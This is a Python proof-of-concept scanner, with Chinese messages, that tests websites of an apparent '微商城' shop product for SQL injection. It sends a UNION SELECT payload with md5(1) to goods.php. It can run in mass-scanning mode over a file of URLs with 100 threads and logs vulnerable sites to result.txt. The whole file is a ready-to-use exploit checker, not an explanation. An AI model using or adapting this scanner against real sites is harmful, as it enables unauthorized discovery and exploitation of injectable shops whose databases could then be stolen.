import requests,argparse,sys,re
from multiprocessing.dummy import Pool
from urllib.parse import quote
from requests.packages import urllib3
# 关闭警告
urllib3.disable_warnings()

def poc(target):

    target = target.strip()
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target   

    payload="/goods.php?id=%27+UNION+ALL+SELECT+NULL,NULL,NULL,md5(1),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-"

    header= {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'Accept': '*/*'

    }

    try:
        re1=requests.get(url=target,headers=header,verify=False)
        if re1.status_code==200:
            re2= requests.get(url=target+payload,timeout=5,verify=False)
            #判断条件

            if  'c4ca' in re2.text:
                print(f"[+]该网站{target}存在sql漏洞")

                with open('result.txt','a',encoding='utf-8') as f:
                    f.write('微商城sql'+target+'\n')
            else:
                print(f"[-]该网站{target}不存在sql漏洞")
        else:
            print(f"[*]该网站{target}访问有问题")
    except:
        pass

def main():
    
    parse = argparse.ArgumentParser(description="微商城goods.php接口存在SQL注入漏洞")

    parse.add_argument('-u','--url',type=str,dest='url',help='输入url测试')
    parse.add_argument('-file','--file',type=str,dest='file',help='输入url文件测试')

    args =parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Python {sys.argv[0]} ")
            
    
if __name__=='__main__':
    main()